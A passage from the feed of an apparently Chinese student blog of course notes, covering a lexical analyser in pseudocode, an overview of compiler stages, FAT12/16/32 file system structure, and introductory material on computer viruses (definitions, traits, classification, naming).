class="line">                  getchar();</span><br><span class="line">                  if cha = ‘=’ then return($LE, 0)</span><br><span class="line">                  <span class="keyword">else</span> </span><br><span class="line">                    if cha = ‘&gt;’ then return($NE, 0);</span><br><span class="line">                  retract();  return($LT,0)</span><br><span class="line">                <span class="keyword">end</span>;</span><br><span class="line">                ‘ &gt; ’:   <span class="keyword">begin</span></span><br><span class="line">                  getchar();</span><br><span class="line">                  if cha= ‘ = ’ then return($GE, 0);</span><br><span class="line">                  retract();</span><br><span class="line">                  return($GT, 0)</span><br><span class="line">                <span class="keyword">end</span>;</span><br><span class="line">                ‘ : ’:    <span class="keyword">begin</span></span><br><span class="line">                  getchar();</span><br><span class="line">                  <span class="keyword">if</span> cha = ‘ = ‘ <span class="keyword">then</span>   </span><br><span class="line">                      return(<span class="number">$A</span>SSIGN,<span class="number">0</span>)</span><br><span class="line">                  <span class="keyword">else</span> error(<span class="number">1</span>)</span><br><span class="line">                <span class="keyword">end</span>;</span><br><span class="line">                other: error(<span class="number">2</span>)</span><br><span class="line">                <span class="keyword">end</span> <span class="keyword">of</span> <span class="keyword">case</span>;</span><br><span class="line"><span class="keyword">End</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>以上代码将词法分析器实现为一个函数LexAnalyze()，函数没执行一次，就会从输入字符串中识别出一个单词符号并按二元式形式返回。</p></blockquote>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;编译原理第六章-词法分析&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#编译原理第六章-词法分析&quot;&gt;&lt;/a&gt; 编译原理第六章-词法分析&lt;/h1&gt;
&lt;p&gt;词法分析：编译程序对源程序进行分析和目标程序合成，最终生成目标程序&lt;/p&gt;
&lt;p&gt;预处理子程序（预处理器）功能：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;删除编辑用字符，如制表符、换页符等&lt;/li&gt;
&lt;li&gt;删除注释&lt;/li&gt;
&lt;li&gt;合并多个空白字符为单个空白字符&lt;/li&gt;
&lt;li&gt;组合多个独立文件中的源程序&lt;/li&gt;
&lt;li&gt;展开宏定义&lt;/li&gt;
&lt;li&gt;条件编译的选择等&lt;/li&gt;
&lt;/ol&gt;</summary>
    
    
    
    <category term="编译原理" scheme="https://wsw8.online/categories/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/"/>
    
    
    <category term="课程" scheme="https://wsw8.online/tags/%E8%AF%BE%E7%A8%8B/"/>
    
    <category term="计算机" scheme="https://wsw8.online/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA/"/>
    
    <category term="编译原理" scheme="https://wsw8.online/tags/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/"/>
    
  </entry>
  
  <entry>
    <title>编译原理第五章</title>
    <link href="https://wsw8.online/archives/8c99cde2.html"/>
    <id>https://wsw8.online/archives/8c99cde2.html</id>
    <published>2021-04-26T09:42:44.000Z</published>
    <updated>2021-05-10T08:30:00.478Z</updated>
    
    <content type="html"><![CDATA[<h3 id="编译概述"><a class="markdownIt-Anchor" href="#编译概述"></a> 编译概述</h3><h4 id="1-不同语言程序之间的翻译"><a class="markdownIt-Anchor" href="#1-不同语言程序之间的翻译"></a> 1. 不同语言程序之间的翻译</h4><h5 id="11-翻译"><a class="markdownIt-Anchor" href="#11-翻译"></a> 1.1 翻译</h5><p>定义：语法单位之间等价的变换<br />就是将一种语言编写的程序转换成等价的另一种语言编写的程序</p><h5 id="12-特殊的翻译汇编-编译"><a class="markdownIt-Anchor" href="#12-特殊的翻译汇编-编译"></a> 1.2 特殊的翻译：汇编、编译</h5><p>汇编：将汇编语言程序翻译为机器语言的程序<br />编译：将高级语言程序翻译为低级语言的程序</p><span id="more"></span><h5 id="13-翻译程序"><a class="markdownIt-Anchor" href="#13-翻译程序"></a> 1.3 翻译程序</h5><p>定义：完成翻译工作的程序，也叫翻译器</p><p><img src="/images/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC%E4%BA%94%E7%AB%A0/image-20210426201154954.png" alt="image-20210426201154954" /></p><p>宿主语言：翻译程序对应的语言<br />宿主机：运行翻译程序的机器</p><h5 id="14-编译程序"><a class="markdownIt-Anchor" href="#14-编译程序"></a> 1.4 编译程序</h5><p>定义：实现编译的翻译程序，也叫编译器</p><p><img src="/images/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC%E4%BA%94%E7%AB%A0/image-20210426201419434.png" alt="image-20210426201419434" /></p><p>自驻留的编译程序：编译程序生成宿主机执行的机器代码<br />自编译的编译程序：编译程序是用源语言写的<br />交叉编译：编译程序生成的不是宿主机执行的机器代码</p><h4 id="2-编译的步骤"><a class="markdownIt-Anchor" href="#2-编译的步骤"></a> 2. 编译的步骤</h4><p>逻辑上分为两部分：</p><ol><li>源程序的分析</li><li>目标程序的合成</li></ol><p>具体为5个步骤：</p><ol><li>词法分析</li><li>语法分析</li><li>语义分析与中间代码生成</li><li>中间代码优化</li><li>目标代码生成</li></ol><p><strong>编译的每个步骤都需要：</strong></p><ol><li>符号表管理</li><li>出错处理</li></ol><h5 id="21-词法分析"><a class="markdownIt-Anchor" href="#21-词法分析"></a> 2.1 词法分析</h5><p>分析输入的字符串，根据词法规则识别出单词符号<br />单词符号：基本字、标识符、字面常量、运算符、界符</p><h5 id="22-语法规则"><a class="markdownIt-Anchor" href="#22-语法规则"></a> 2.2 语法规则</h5><p>根据语法规则，识别各类语法单位并进行语法检查<br />语法单位：表达式、语句、程序单元、程序</p><h5 id="23-语义分析与中间代码生成"><a class="markdownIt-Anchor" href="#23-语义分析与中间代码生成"></a> 2.3 语义分析与中间代码生成</h5><p>根据语义规则，对语法正确的语法单位进行翻译<br />注：可以直接生成目标程序，但目标程序执行效率低，故而生成中间代码</p><p>中间代码：大多数的编译器采用中间代码来描述源程序的语义，这种中间语言对应某种抽象机，结构简单，语义明确，易于翻译成目标代码，同时也便于优化和移植。</p><h5 id="24-优化"><a class="markdownIt-Anchor" href="#24-优化"></a> 2.4 优化</h5><p>对中间代码进行等价变换，提高代码的时空效率<br />注：语义分析产生的中间代码不依赖于实际的机器，故而易于做一些等价变换，使生成的目标程序占用空间更少，执行更快。</p><h5 id="25-目标代码生成"><a class="markdownIt-Anchor" href="#25-目标代码生成"></a> 2.5 目标代码生成</h5><p>根据优化后的中间代码以及有关信息，可生成较为有效的目标代码<br />目标代码：目标机的机器语言程序或汇编语言程序<br />注：若生成的是汇编语言程序，还需将其汇编成机器语言程序</p><h5 id="26-符号表管理"><a class="markdownIt-Anchor" href="#26-符号表管理"></a> 2.6 符号表管理</h5><p>描述符表：存放实体属性的表格<br />注：根据实体的不同，表格的形式也不同，其中最主要的是<strong>符号表</strong><br />注：编译程序应有一组表格管理程序，负责表格的建立、维护、引用、查找、更新</p><h5 id="27-出错处理"><a class="markdownIt-Anchor" href="#27-出错处理"></a> 2.7 出错处理</h5><p>编译程序发现错误后进行出错处理，包括报告错误的性质和发生错误的位置等</p><h5 id="28-编译器的结构"><a class="markdownIt-Anchor" href="#28-编译器的结构"></a> 2.8 编译器的结构</h5><p><img src="/images/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC%E4%BA%94%E7%AB%A0/image-20210426210832819.png" alt="image-20210426210832819" /></p><h4 id="3-完整的程序处理过程"><a class="markdownIt-Anchor" href="#3-完整的程序处理过程"></a> 3. 完整的程序处理过程</h4><p>从分析源程序到建立一个可执行的目标程序，处理过程还需要<strong>预处理器、汇编器、连接器、装入器</strong></p><h5 id="31-完整的程序处理过程"><a class="markdownIt-Anchor" href="#31-完整的程序处理过程"></a> 3.1 完整的程序处理过程</h5><p><img src="/images/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC%E4%BA%94%E7%AB%A0/image-20210426211128343.png" alt="image-20210426211128343" /></p><h4 id="4-编译前端与后端"><a class="markdownIt-Anchor" href="#4-编译前端与后端"></a> 4. 编译前端与后端</h4><p>现代编译器通常将编译过程划分为前端和后端分别实现，它们通过中间代码连接，可极大提高编译器设计与实现的效率</p><h5 id="41-前端"><a class="markdownIt-Anchor" href="#41-前端"></a> 4.1 前端</h5><p>主要是与源程序相关的部分，包括词法、语法分析、语义分析、中间代码生成等</p><h5 id="42-后端"><a class="markdownIt-Anchor" href="#42-后端"></a> 4.2 后端</h5><p>主要是与目标程序相关的部分，包括优化、目标代码生成等</p><h4 id="5-结语"><a class="markdownIt-Anchor" href="#5-结语"></a> 5. 结语</h4><p>词法分析基于有限状态自动机FA<br />语法分析基于下推自动机PDA</p>]]></content>
    
    
    <summary type="html">&lt;h3 id=&quot;编译概述&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#编译概述&quot;&gt;&lt;/a&gt; 编译概述&lt;/h3&gt;
&lt;h4 id=&quot;1-不同语言程序之间的翻译&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#1-不同语言程序之间的翻译&quot;&gt;&lt;/a&gt; 1. 不同语言程序之间的翻译&lt;/h4&gt;
&lt;h5 id=&quot;11-翻译&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#11-翻译&quot;&gt;&lt;/a&gt; 1.1 翻译&lt;/h5&gt;
&lt;p&gt;定义：语法单位之间等价的变换&lt;br /&gt;
就是将一种语言编写的程序转换成等价的另一种语言编写的程序&lt;/p&gt;
&lt;h5 id=&quot;12-特殊的翻译汇编-编译&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#12-特殊的翻译汇编-编译&quot;&gt;&lt;/a&gt; 1.2 特殊的翻译：汇编、编译&lt;/h5&gt;
&lt;p&gt;汇编：将汇编语言程序翻译为机器语言的程序&lt;br /&gt;
编译：将高级语言程序翻译为低级语言的程序&lt;/p&gt;</summary>
    
    
    
    <category term="编译原理" scheme="https://wsw8.online/categories/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/"/>
    
    
    <category term="课程" scheme="https://wsw8.online/tags/%E8%AF%BE%E7%A8%8B/"/>
    
    <category term="计算机" scheme="https://wsw8.online/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA/"/>
    
    <category term="编译原理" scheme="https://wsw8.online/tags/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/"/>
    
  </entry>
  
  <entry>
    <title>病毒-基础-文件系统</title>
    <link href="https://wsw8.online/archives/c3d31f32.html"/>
    <id>https://wsw8.online/archives/c3d31f32.html</id>
    <published>2021-04-25T08:28:28.000Z</published>
    <updated>2021-05-10T08:30:36.588Z</updated>
    
    <content type="html"><![CDATA[<h4 id="初识文件系统"><a class="markdownIt-Anchor" href="#初识文件系统"></a> 初识文件系统</h4><p>文件系统就是组织文件的一种方式<br />文件管理包括文件生成、删除、目录查询等<br />eg：</p><ol><li>Windows文件系统：FAT12、FAT16、FAT32、NTFS</li><li>Linux文件系统：EXT2</li></ol><span id="more"></span><h4 id="fat12文件系统的磁盘格式"><a class="markdownIt-Anchor" href="#fat12文件系统的磁盘格式"></a> FAT12文件系统的磁盘格式</h4><ol><li>引导扇区（DBR）：记录各种参数，比如扇区大小，一簇的扇区数</li><li>文件分配表（FAT）：记录已分配的扇区和可用扇区</li><li>文件目录表（DIR）：记录根目录文件项的表，文件项包括文件，目录。</li><li>用户数据：存放数据的区域</li></ol><p><img src="/images/%E7%97%85%E6%AF%92-%E5%9F%BA%E7%A1%80-%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/image-20210425164158141.png" alt="image-20210425164158141" /></p><p>注：左侧为扇区号、第二个FAT12为备用FAT</p><h4 id="如何定位到一个文件"><a class="markdownIt-Anchor" href="#如何定位到一个文件"></a> 如何定位到一个文件</h4><h5 id="fat表的格式"><a class="markdownIt-Anchor" href="#fat表的格式"></a> FAT表的格式</h5><p>在文件系统中，文件分配的最小单位是簇，哪怕只有一个字节也会分配一簇<br />簇是由n个扇区组成<br />其中n在引导扇区的引导记录中定义</p><p><img src="/images/%E7%97%85%E6%AF%92-%E5%9F%BA%E7%A1%80-%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/image-20210428094415697.png" alt="image-20210428094415697" /></p><h5 id="fat表的本质"><a class="markdownIt-Anchor" href="#fat表的本质"></a> FAT表的本质</h5><p>FAT表的本质是<strong>磁盘簇分配情况的数据表示</strong></p><p>在FAT12文件系统中，FAT表以3个<strong>半字节</strong>（3*0.5Byte=1.5Byte=12bit）来记录一个簇的相关情况，这也是FAT12中12的由来</p><p>FAT表中每3个<strong>半字节</strong>为一个元素，这个元素就代表一个簇，簇号从0开始，这个元素中<strong>存放的整数值</strong>表示其链接的下一簇的簇号</p><h5 id="fat表的查找与遍历机制"><a class="markdownIt-Anchor" href="#fat表的查找与遍历机制"></a> FAT表的查找与遍历机制</h5><p>FAT表是一个数组，数组中每个元素是1.5字节的整数，为了查找FAT表中簇号为N的元素，只需用N作索引查找FAT[N]元素，如下图：</p><p><img src="/images/%E7%97%85%E6%AF%92-%E5%9F%BA%E7%A1%80-%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/image-20210428095326854.png" alt="image-20210428095326854" /></p><p>真正在FAT12表中的查找方法：</p><p><img src="/images/%E7%97%85%E6%AF%92-%E5%9F%BA%E7%A1%80-%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/image-20210428095655541.png" alt="image-20210428095655541" /></p><p>注意：三个字节中如何分配的两个半字节，可以结合<strong>小端机</strong>中数据的存放规则记忆</p><h5 id="遍历一个文件占用的簇"><a class="markdownIt-Anchor" href="#遍历一个文件占用的簇"></a> 遍历一个文件占用的簇</h5><p><img src="/images/%E7%97%85%E6%AF%92-%E5%9F%BA%E7%A1%80-%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/image-20210428100002898.png" alt="image-20210428100002898" /></p><h5 id="如何获取首簇号"><a class="markdownIt-Anchor" href="#如何获取首簇号"></a> 如何获取首簇号</h5><p>根目录区有根目录表，其记录了文件的各种信息。<br />根目录表中包含多条记录，每条记录占32个字节</p><p>现在我们关注根目录表中的<strong>文件名</strong>字段和<strong>首簇号</strong>字段<br />文件名</p><blockquote><p>在记录首部偏移0开始，共<strong>11字节</strong>，前8个字节记录文件名，后3个字节记录扩展名（中间的.不需要记录）名字的结束以空格表示（即0x20）</p></blockquote><p>首簇号</p><blockquote><p>首簇号首部偏移0x1A开始，共2个字节</p></blockquote><p>下图是getexe.com的文件名与首簇号图示，getexe只占用6个字节，后两个字节用空格填充，首簇号是0003</p><p><img src="/images/%E7%97%85%E6%AF%92-%E5%9F%BA%E7%A1%80-%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/image-20210428160041729.png" alt="image-20210428160041729" /></p><h5 id="如何查找根目录"><a class="markdownIt-Anchor" href="#如何查找根目录"></a> 如何查找根目录</h5><ol><li>从磁盘0头0道1扇区读出引导区（Boot）512字节，从其中引导记录获取相关信息：Boot区占用扇区数，FAT表数目，每个FAT表的扇区数，1个扇区的字节数</li><li>计算根目录区的起始位置为：<br />[ 1（Boot区扇区数）+2（FAT数目）*9（FAT扇区数）] * 512 = 0x2600<br />即2600h为根目录区起始位置</li><li>从引导记录获取根区记录数，缺省224条，按每条记录32字节读出所有记录</li><li>每条记录开始11个字节为文件名，比较文件名匹配则找到记录，从首簇字段（从该记录开始偏移1Ah处）获得首簇号</li></ol><h5 id="多级目录的查找流程"><a class="markdownIt-Anchor" href="#多级目录的查找流程"></a> 多级目录的查找流程</h5><p>以查找a:\tem\tem.txt为例</p><p>大致思想：</p><blockquote><p>在根目录区下的tem项，会给出tem项的首簇号，系统就可以通过FAT表在数据区找到tem对应的信息（即tem目录表），在这个tem目录表下，再通过该目录表的项（每项32字节），继续查找tem下的文件或更下层的目录，如此，即可形成多层次的目录嵌套</p></blockquote><p>详细流程：</p><p><img src="/images/%E7%97%85%E6%AF%92-%E5%9F%BA%E7%A1%80-%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/image-20210428161152854.png" alt="image-20210428161152854" /></p><h5 id="总结"><a class="markdownIt-Anchor" href="#总结"></a> 总结</h5><ol><li>根据文件路径第一项先查看根目录表，是否有匹配的项，如果有，通过对应项的首簇段获取该子目录表的首簇号</li><li>通过首簇号和FAT表获得子目录表的全部内容，根据文件路径的第二项，遍历子目录表，一次偏移32字节用名字匹配的方法查找记录项，如果找到则重复1、2步查找下一项，找不到则结束</li><li>如果找到了最后一层目录表（路径的倒数第二项，最后一项是文件名），在其中找到了被查文件的项，从中获取首簇号，即可通过FAT表访问整个文件簇</li></ol><h4 id="如何删除文件"><a class="markdownIt-Anchor" href="#如何删除文件"></a> 如何删除文件</h4><p>只要使目录文件中的记录项无效就可以了，实际目录项的第一个字节被修改成了<code>E5</code>，而对于FAT表中的簇，我们只要把簇链的每一项复原成<code>00</code>就可以了</p><p>也就是说，删除文件其实只修改了目录文件和FAT表，实际的文件扇区并没有修改</p><h4 id="如何恢复文件"><a class="markdownIt-Anchor" href="#如何恢复文件"></a> 如何恢复文件</h4><p>在目录表中查找<code>E5+后续文件名</code>，根据偏移关系找到首簇号，对于只有一个簇的文件恢复简单，将目录表和FAT表中的值更改即可，可是簇链消失了，对于占用多个簇的文件恢复较为复杂，需要遍历数据区，匹配文件标识等恢复簇链</p><h4 id="如何创建文件"><a class="markdownIt-Anchor" href="#如何创建文件"></a> 如何创建文件</h4><ol><li>首先定位到文件所在的目录文件，然后查找目录项，如果第一个字节为00或E5表示可用</li><li>根据文件大小计算簇数目，然后在FAT表首部（簇2）开始查找值为00的项，将其簇号写入第一步找到的目录项的首簇号字段</li><li>继续在FAT表中找00的项，将簇号写入前一步找到的项中以形成簇链，最后一个簇写入FFF</li><li>填写文件目录项的创建时间，属性，大小的字段</li></ol><h4 id="fat16和fat32文件系统"><a class="markdownIt-Anchor" href="#fat16和fat32文件系统"></a> FAT16和FAT32文件系统</h4><p>FAT16：</p><ol><li>FAT表项为16bits（2字节）</li><li>最大簇号0xFFFF，就是65535</li><li>一簇为32k</li><li>最多管理32k*65535=2GB的分区</li></ol><p>FAT32：</p><ol><li>FAT表项为32bits（4字节）</li><li>取消了根目录区，而是在引导记录中存放指向根目录区的首簇字段，一般为簇2，</li><li>支持长名文件，由扩展的32字节记录项构成</li><li>首簇号由2个字段构成，分别代表高位两字节和低位两字节</li><li>引导区有保留区</li></ol>]]></content>
    
    
    <summary type="html">&lt;h4 id=&quot;初识文件系统&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#初识文件系统&quot;&gt;&lt;/a&gt; 初识文件系统&lt;/h4&gt;
&lt;p&gt;文件系统就是组织文件的一种方式&lt;br /&gt;
文件管理包括文件生成、删除、目录查询等&lt;br /&gt;
eg：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Windows文件系统：FAT12、FAT16、FAT32、NTFS&lt;/li&gt;
&lt;li&gt;Linux文件系统：EXT2&lt;/li&gt;
&lt;/ol&gt;</summary>
    
    
    
    <category term="病毒" scheme="https://wsw8.online/categories/%E7%97%85%E6%AF%92/"/>
    
    
    <category term="课程" scheme="https://wsw8.online/tags/%E8%AF%BE%E7%A8%8B/"/>
    
    <category term="病毒" scheme="https://wsw8.online/tags/%E7%97%85%E6%AF%92/"/>
    
    <category term="计算机" scheme="https://wsw8.online/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>病毒-基础-代码初始</title>
    <link href="https://wsw8.online/archives/b087ef83.html"/>
    <id>https://wsw8.online/archives/b087ef83.html</id>
    <published>2021-04-25T06:46:11.000Z</published>
    <updated>2021-05-10T08:30:29.267Z</updated>
    
    <content type="html"><![CDATA[<h4 id="1-代码初识"><a class="markdownIt-Anchor" href="#1-代码初识"></a> 1. 代码初识</h4><p>我们需要掌握的工具</p><ol><li>vc反汇编调试</li><li>文本编辑工具UltraEdit（UE）</li><li>ollydebug调试（od）</li><li>静态反汇编工具ida</li><li>汇编代码撰写工具nasm</li></ol><span id="more"></span><h4 id="2-大端机和小端机"><a class="markdownIt-Anchor" href="#2-大端机和小端机"></a> 2. 大端机和小端机</h4><p>小端机：高位地址存放高位数据、低位地址存放低位数据。例如Intel的X86系列CPU<br />小端机：高位地址存放低位数据、低位地址存放高位数据。例如PowerPC、Sun的SPARC、Motorola 6800</p><h4 id="3-jmp指令解析"><a class="markdownIt-Anchor" href="#3-jmp指令解析"></a> 3. JMP指令解析</h4><p><img src="/images/%E7%97%85%E6%AF%92-%E5%9F%BA%E7%A1%80-%E4%BB%A3%E7%A0%81%E5%88%9D%E5%A7%8B/image-20210425160344966.png" alt="image-20210425160344966" /></p><p>Jmp 无条件跳转指令，有以下四种用法：</p><p><img src="/images/%E7%97%85%E6%AF%92-%E5%9F%BA%E7%A1%80-%E4%BB%A3%E7%A0%81%E5%88%9D%E5%A7%8B/image-20210425160536816.png" alt="image-20210425160536816" /></p><p>注意：在上述PPT中使用了Jmp offset的方式，其中地址2的地址是地址1的地址加上5个字节</p><p><strong>使用反汇编修改内存和使用工具修改硬盘文件步骤一样，工具不同，本质相同</strong></p>]]></content>
    
    
    <summary type="html">&lt;h4 id=&quot;1-代码初识&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#1-代码初识&quot;&gt;&lt;/a&gt; 1. 代码初识&lt;/h4&gt;
&lt;p&gt;我们需要掌握的工具&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;vc反汇编调试&lt;/li&gt;
&lt;li&gt;文本编辑工具UltraEdit（UE）&lt;/li&gt;
&lt;li&gt;ollydebug调试（od）&lt;/li&gt;
&lt;li&gt;静态反汇编工具ida&lt;/li&gt;
&lt;li&gt;汇编代码撰写工具nasm&lt;/li&gt;
&lt;/ol&gt;</summary>
    
    
    
    <category term="病毒" scheme="https://wsw8.online/categories/%E7%97%85%E6%AF%92/"/>
    
    
    <category term="课程" scheme="https://wsw8.online/tags/%E8%AF%BE%E7%A8%8B/"/>
    
    <category term="病毒" scheme="https://wsw8.online/tags/%E7%97%85%E6%AF%92/"/>
    
    <category term="计算机" scheme="https://wsw8.online/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>病毒_概述</title>
    <link href="https://wsw8.online/archives/c513bfe.html"/>
    <id>https://wsw8.online/archives/c513bfe.html</id>
    <published>2021-04-22T11:36:05.000Z</published>
    <updated>2021-05-10T08:30:21.556Z</updated>
    
    <content type="html"><![CDATA[<h4 id="你能学到什么"><a class="markdownIt-Anchor" href="#你能学到什么"></a> 你能学到什么？</h4><ol><li>代码解密</li><li>文件系统和硬盘数据结构</li><li>DOS下的病毒技术：文件型病毒，引导型病毒，中断型病毒</li><li>Windows下的病毒：PE病毒，导入表，导出表，病毒的入口点模糊技术</li></ol><h4 id="先决课程"><a class="markdownIt-Anchor" href="#先决课程"></a> 先决课程</h4><ol><li>汇编语言</li><li>计算机组成原理</li></ol><span id="more"></span><h4 id="11-病毒定义"><a class="markdownIt-Anchor" href="#11-病毒定义"></a> 1.1 病毒定义</h4><p>计算机病毒：病毒特征+程序代码</p><h4 id="12-病毒的本质与特征"><a class="markdownIt-Anchor" href="#12-病毒的本质与特征"></a> 1.2 病毒的本质与特征</h4><p><strong>病毒的固有本质属性：人为的特制程序</strong><br />程序性和客观性决定了病毒的可防治性和可清除性<br />人为性和主观性导致了病毒各异多变</p><h5 id="基本特征传染性"><a class="markdownIt-Anchor" href="#基本特征传染性"></a> 基本特征：传染性</h5><p>传染性是指计算机病毒把自身复制到其他程序的能力<br />即将自身的代码<strong>强行</strong>传染到<strong>一切符合其传染条件</strong>的程序之上<br />是否具有传染性是判别一个程序是否为计算机病毒的<strong>首要条件</strong></p><h5 id="基本特征隐蔽性"><a class="markdownIt-Anchor" href="#基本特征隐蔽性"></a> 基本特征：隐蔽性</h5><p>传染过程的隐蔽性<br />病毒存在的隐蔽性</p><h5 id="基本特征可触发性"><a class="markdownIt-Anchor" href="#基本特征可触发性"></a> 基本特征：可触发性</h5><p>可触发性是指因某个事件或数值的出现，触发病毒实施感染或攻击破坏<br />即隐藏又保持破坏力</p><h5 id="其他基本特征"><a class="markdownIt-Anchor" href="#其他基本特征"></a> 其他基本特征</h5><ol><li>欺骗性</li><li>非授权性</li><li>寄生性</li><li>衍生性</li><li>持久性</li><li>破坏性</li><li>针对性</li><li>不可预见性</li></ol><h4 id="13-病毒的分类"><a class="markdownIt-Anchor" href="#13-病毒的分类"></a> 1.3 病毒的分类</h4><ol><li><p>根据病毒表现行为分类</p><p><img src="/images/%E7%97%85%E6%AF%92-%E6%A6%82%E8%BF%B0/image-20210422205247089.png" alt="image-20210422205247089" /></p></li><li><p>根据病毒的内部机理分类<br /><img src="/images/%E7%97%85%E6%AF%92-%E6%A6%82%E8%BF%B0/image-20210422205355394.png" alt="image-20210422205355394" /></p></li></ol><h4 id="14-恶意程序-蠕虫-木马"><a class="markdownIt-Anchor" href="#14-恶意程序-蠕虫-木马"></a> 1.4 恶意程序 蠕虫 木马</h4><p>恶意程序：未经授权便干扰或破坏计算机系统/网络的程序或代码，早期恶意代码的主要形式是计算机病毒<br />蠕虫：独立的可执行程序，不需要寄生在宿主程序中，通过网络分发自己的副本<br />病毒和蠕虫的区别：<br /><img src="/images/%E7%97%85%E6%AF%92-%E6%A6%82%E8%BF%B0/image-20210422205811795.png" alt="image-20210422205811795" /><br />特洛伊木马：在远程计算机之间建立连接，使得远程计算机能通过网络控制本地计算机的非法程序</p><h4 id="15-病毒的命名规则"><a class="markdownIt-Anchor" href="#15-病毒的命名规则"></a> 1.5 病毒的命名规则</h4><p>一些普通命名规则</p><ol><li>按病毒的发作时间命名</li><li>按病毒的发作症状命名</li><li>按病毒的发现地命名</li><li>按病毒的字节长度命名</li></ol><p>国际命名惯例<br />前缀（病毒的种类）+病毒名（病毒家族的特征）+后缀（区分病毒变种）</p>]]></content>
    
    
    <summary type="html">&lt;h4 id=&quot;你能学到什么&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#你能学到什么&quot;&gt;&lt;/a&gt; 你能学到什么？&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;代码解密&lt;/li&gt;
&lt;li&gt;文件系统和硬盘数据结构&lt;/li&gt;
&lt;li&gt;DOS下的病毒技术：文件型病毒，引导型病毒，中断型病毒&lt;/li&gt;
&lt;li&gt;Windows下的病毒：PE病毒，导入表，导出表，病毒的入口点模糊技术&lt;/li&gt;
&lt;/ol&gt;
&lt;h4 id=&quot;先决课程&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#先决课程&quot;&gt;&lt;/a&gt; 先决课程&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;汇编语言&lt;/li&gt;
&lt;li&gt;计算机组成原理&lt;/li&gt;
&lt;/ol&gt;</summary>
    
    
    
    <category term="病毒" scheme="https://wsw8.online/categories/%E7%97%85%E6%AF%92/"/>
    
    
    <category term="课程" scheme="https://wsw8.online/tags/%E8%AF%BE%E7%A8%8B/"/>
    
    <category term="病毒" scheme="https://wsw8.online/tags/%E7%97%85%E6%AF%92/"/>
    
    <category term="计算机" scheme="https://wsw8.online/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA/"/>
    
  </entry>
  
</feed>
